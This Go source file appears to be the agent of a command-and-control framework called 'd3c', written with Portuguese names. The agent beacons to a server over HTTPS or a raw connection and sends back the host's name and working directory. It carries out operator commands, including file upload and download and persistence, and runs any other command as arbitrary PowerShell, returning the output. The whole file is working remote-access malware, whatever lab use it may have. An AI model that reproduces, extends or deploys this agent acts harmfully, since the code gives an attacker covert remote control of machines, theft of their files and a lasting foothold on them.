package main

import (
	"crypto/md5"
	"d3c/agente/commands"
	"d3c/agente/connectors"
	. "d3c/agente/helpers"
	"d3c/commons/estruturas"
	"d3c/commons/helpers"
	"d3c/commons/interfaces"
	"encoding/hex"
	"log"
	"os"
	"os/exec"
	"runtime"
	"time"
)

var (
	mensagem estruturas.Mensagem
)

const (
	SERVIDOR = "127.0.0.1"
	PORTA    = "8443"
	CONEXAO  = "https"
)

func init() {

	EvitaMultiplosAgentes()

	mensagem.AgentHostname, _ = os.Hostname()
	mensagem.AgentCWD, _ = os.Getwd()
	mensagem.AgentID = geraID()
	mensagem.TempoEspera = 5
}

func main() {
	log.Println("Entrei em Execução")
	for {
		switch CONEXAO {
		case "raw":
			rawConnector := connectors.RawConnector{}
			rawConnector.Execute(SERVIDOR, PORTA, &mensagem)
		case "https":
			httpsConnector := connectors.HttpsConnector{}
			httpsConnector.Execute(SERVIDOR, PORTA, &mensagem)
		}

		if mensagemContemComandos(mensagem) {
			for indice, comando := range mensagem.Comandos {
				comandoId := ValidaComando(helpers.SeparaComando(comando.Comando)[0])

				if comandoId != 0 {
					mapping := map[int]interfaces.Command{
						1: commands.Cd{Comando: comando.Comando},
						2: commands.Ls{Comando: comando.Comando},
						3: commands.Ps{},
						4: commands.Pwd{},
						5: commands.Whoami{},
						6: commands.Sleep{Comando: comando.Comando, Mensagem: &mensagem},
						7: commands.Send{Arquivo: comando.Arquivo},
						8: commands.Get{Comando: comando.Comando, ComandoId: indice, Mensagem: &mensagem},
						9: commands.Persiste{Comando: comando.Comando},
					}
					mensagem.Comandos[indice].Resposta = mapping[comandoId].Executar()
				} else {
					mensagem.Comandos[indice].Resposta = executaComandoEmShell(comando.Comando)
				}
			}
		}
		time.Sleep(time.Duration(mensagem.TempoEspera) * time.Second)
	}

}

func executaComandoEmShell(comandoCompleto string) (resposta string) {

	if (runtime.GOOS) == "windows" {
		output, _ := exec.Command("powershell.exe", "/C", comandoCompleto).CombinedOutput()

		resposta = string(output)
	} else {
		resposta = "Sistema operacional alvo nao implementado para acesso ao shell."
	}

	return resposta
}

func mensagemContemComandos(mensagemDoServidor estruturas.Mensagem) (contem bool) {
	contem = false

	if len(mensagemDoServidor.Comandos) > 0 {
		contem = true
	}

	return contem
}

func geraID() string {
	myTime := time.Now().String()

	hasher := md5.New()
	hasher.Write([]byte(mensagem.AgentHostname + myTime))

	return hex.EncodeToString(hasher.Sum(nil))
}
